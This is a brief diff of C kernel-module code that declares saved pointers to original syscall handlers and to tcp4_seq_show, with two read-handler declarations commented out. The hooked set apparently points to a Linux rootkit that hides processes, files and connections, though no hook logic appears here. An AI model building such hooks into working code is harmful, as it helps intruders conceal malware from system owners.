@@ -31,7 +31,7 @@ ptregs_t orig_openat;
 ptregs_t orig_statx;
 ptregs_t orig_execve;
 static asmlinkage ssize_t (*orig_pread64)(const struct pt_regs *regs);
-static asmlinkage ssize_t (*orig_read)(const struct pt_regs *regs);
+//static asmlinkage ssize_t (*orig_read)(const struct pt_regs *regs);
 #else
 // remove arg names for definitions
 static asmlinkage int (*orig_kill)(pid_t pid, int sig);
@@ -41,7 +41,7 @@ static asmlinkage int (*orig_reboot)(int magic, int magic2, int cmd, void *arg);
 static asmlinkage int (*orig_openat)(int dfd, const char *filename, int flags, umode_t mode);
 static asmlinkage int (*orig_statx)(int dirfd, const char *restrict pathname, int flags, unsigned int mask, struct statx *restrict statxbuf);
 static asmlinkage ssize_t (*orig_pread64)(unsigned int fd, char *buf, size_t count, loff_t pos);
-static asmlinkage ssize_t (*orig_read)(int fd, void *buf, size_t count);
+//static asmlinkage ssize_t (*orig_read)(int fd, void *buf, size_t count);
 static asmlinkage int (*orig_execve)(const char *pathname, char *const argv[], char *const envp[]);
 #endif
 static asmlinkage long (*orig_tcp4_seq_show)(struct seq_file *seq, void *v);
